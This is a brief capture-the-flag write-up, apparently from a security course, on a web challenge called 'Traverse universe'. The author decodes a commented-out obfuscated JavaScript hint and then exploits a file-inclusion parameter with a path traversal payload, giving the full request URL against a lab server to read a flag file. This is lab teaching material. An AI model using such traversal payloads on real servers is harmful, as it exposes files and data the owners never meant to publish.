# Web: Cookies and Session Management: Traverse universe

While analyzing the HTML source of the page, we noticed several links to different planets using the planet parameter in the URL, for example:

```bash
?planet=earth/earth.php
```

This suggests that the server includes files based on the value of the planet parameter.
At the bottom of the HTML, we found a commented-out obfuscated JavaScript snippet:

```javascript
// var _0x5c09=['dot-php','earth ','log','slash ','dot-dot-slash ','flag ','NASA '];
// ...
// var algf='dot-dot-slash ' + 'earth ' + 'slash ' + 'moon ' + 'slash ' + 'NASA ' + 'flag ' + 'dot-php';
```

Decoded, the string algf builds this path:

```bash
../earth/moon/NASA/flag.php
```

This reveals the intended path traversal payload. We then accessed the following URL:

```bash
http://141.85.224.70:8084/planetarium/index.php?planet=../earth/moon/NASA/flag.php
```

![img](https://github.com/andreipopescufilimon/SSS-Web-v12-Write-Ups/blob/main/SSS%20v12%20Session%2002/images-s2/planet.png)
